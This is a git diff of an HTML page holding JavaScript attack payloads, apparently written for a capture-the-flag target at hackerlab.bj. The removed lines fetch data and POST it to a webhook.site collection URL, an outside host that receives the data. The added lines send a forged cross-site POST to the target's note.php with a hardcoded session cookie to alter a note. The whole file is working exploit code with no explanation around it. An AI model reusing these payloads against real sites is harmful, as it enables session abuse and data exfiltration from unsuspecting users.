@@ -2,37 +2,45 @@
 <html>
   <body>
 <script>
-fetch('https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492')
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Erreur de requête API : ' + response.statusText);
-      }
-      return response.json(); // Assumer que l'API retourne un JSON
-    })
-    .then(data => {
-      console.log('Données reçues de l\'API :', data);
+  // Les données à envoyer dans le corps de la requête
+  const data = new URLSearchParams();
+  data.append('note-title', 'admin');
+  data.append('note-description', 'admin');
 
-      // Envoyer les données reçues au webhook
-      return fetch('https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data) // Convertir les données en chaîne JSON
-      });
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Erreur lors de l\'envoi au webhook : ' + response.statusText);
-      }
-      return response.text();
-    })
-    .then(responseText => {
-      console.log('Réponse du webhook :', responseText);
-    })
-    .catch(error => {
-      console.error('Erreur :', error);
-    });
-    </script>
+  fetch('https://xnotes.qualif.hackerlab.bj/note.php?id=3390', {
+    method: 'POST',
+    headers: {
+      'Host': 'xnotes.qualif.hackerlab.bj',
+      'Cookie': 'PHPSESSID=70b5662b1d32aac6151996fb9fde9863',
+      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Origin': 'https://xnotes.qualif.hackerlab.bj',
+      'Referer': 'https://xnotes.qualif.hackerlab.bj/note.php?id=3390',
+      'Upgrade-Insecure-Requests': '1',
+      'Sec-Fetch-Dest': 'document',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Site': 'same-origin',
+      'Sec-Fetch-User': '?1',
+      'Te': 'trailers',
+      'Connection': 'close'
+    },
+    body: data
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Erreur de requête : ' + response.statusText);
+    }
+    return response.text();
+  })
+  .then(responseText => {
+    console.log('Réponse :', responseText);
+  })
+  .catch(error => {
+    console.error('Erreur :', error);
+  });
+</script>
   </body>
 </html>
